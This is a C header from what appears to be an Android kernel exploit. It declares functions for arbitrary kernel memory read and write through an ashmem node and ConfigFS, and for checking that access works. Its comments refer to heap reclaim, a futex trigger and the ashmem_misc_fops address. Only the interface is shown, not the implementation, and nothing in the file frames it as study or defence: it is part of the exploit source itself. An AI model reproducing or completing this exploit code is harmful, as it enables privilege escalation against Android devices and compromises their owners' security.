/*
 * Declares ashmem path selection, kernel read/write operations, and access
 * verification.
 */
#ifndef OSS_CLONE_ASHMEM_CONFIGFS_RW_H
#define OSS_CLONE_ASHMEM_CONFIGFS_RW_H

#include <stddef.h>
#include <stdint.h>

int oss_prepare_kernel_rw_path(void);

/* Opens the resolved ashmem node. Lazily resolves it for standalone test
 * callers that do not run app_main(). Returns -1 on failure. */
int oss_open_kernel_rw(void);

enum oss_kernel_io_result {
  OSS_KERNEL_IO_PLAN_REJECTED = -1,
  OSS_KERNEL_IO_FAILED = 0,
  OSS_KERNEL_IO_OK = 1,
};

enum oss_kernel_io_result oss_kernel_read_result(
    int fd, uint64_t target_addr, void *buf, size_t len);
enum oss_kernel_io_result oss_kernel_write_result(
    int fd, uint64_t target_addr, const void *buf, size_t len);
int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len);
int oss_kernel_write(int fd, uint64_t target_addr, const void *buf,
                      size_t len);
int oss_kernel_read_plan_supported(uint64_t target_addr, size_t len);
int oss_kernel_write_plan_supported(uint64_t target_addr, size_t len);
uint64_t oss_kernel_read64(int fd, uint64_t target_addr);
int oss_kernel_write64(int fd, uint64_t target_addr, uint64_t value);

/* Checks every ConfigFS operation used by oss_verify_kernel_access_ex(). This
 * is safe to call after reclaim and before the futex trigger. */
int oss_verify_kernel_access_plan_supported(uint64_t ashmem_misc_fops_addr,
                                            uint64_t page_base);

int oss_verify_kernel_access(int fd, uint64_t ashmem_misc_fops_addr,
                              uint64_t page_base);

/* Same verification with a sticky landing result. The caller initializes it
 * to zero; this function release-stores 1 after any full eight-byte read at
 * the kernel target (which native size-zero ashmem cannot produce), even if
 * the pointer value or a later R/W round trip is wrong. */
int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
                                uint64_t page_base, int *landed);

#endif
